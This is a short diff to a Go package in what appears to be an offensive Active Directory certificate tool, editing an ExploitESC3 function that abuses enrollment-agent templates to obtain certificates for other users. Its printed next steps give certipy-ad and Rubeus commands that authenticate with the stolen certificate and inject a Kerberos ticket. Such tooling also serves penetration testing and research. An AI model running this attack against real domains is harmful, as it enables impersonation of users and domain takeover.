@@ -1,7 +1,7 @@
 package pki
 
 import (
-	"crypto/ecdsa"
+	"crypto"
 	"crypto/x509"
 	"fmt"
 	"strings"
@@ -71,7 +71,7 @@ func ScanESC3(cfg *ADCSConfig) ([]ESC3Finding, error) {
 //
 // The enrollment agent certificate grants the holder the ability to enroll on behalf
 // of other users. This is the ADCS equivalent of constrained delegation abuse.
-func ExploitESC3(cfg *ADCSConfig, templateName, targetUPN string) (*x509.Certificate, *ecdsa.PrivateKey, error) {
+func ExploitESC3(cfg *ADCSConfig, templateName, targetUPN string) (*x509.Certificate, crypto.Signer, error) {
 	fmt.Printf("[!] ESC3 Exploitation: template=%s target=%s\n", templateName, targetUPN)
 
 	// Step 1: Verify the template is ESC3-exploitable
@@ -127,7 +127,7 @@ func ExploitESC3(cfg *ADCSConfig, templateName, targetUPN string) (*x509.Certifi
 	fmt.Printf("[+] Stage 2 complete: certificate obtained for %s via enrollment agent\n", targetUPN)
 	fmt.Printf("[+] ESC3 exploitation successful — two-stage enrollment agent attack\n")
 	fmt.Printf("[*] Next steps:\n")
-	fmt.Printf("    certipy auth -pfx %s.pfx -dc-ip %s\n", upnUser, cfg.TargetDC)
+	fmt.Printf("    certipy-ad auth -pfx %s.pfx -dc-ip <DC_IP> -domain %s\n", upnUser, cfg.Domain)
 	fmt.Printf("    Rubeus.exe asktgt /user:%s /certificate:%s.pfx /ptt\n", targetUPN, upnUser)
 	fmt.Printf("    # The certificate was issued via enrollment agent on template: %s\n", templateName)
 	return cert, certKey, nil
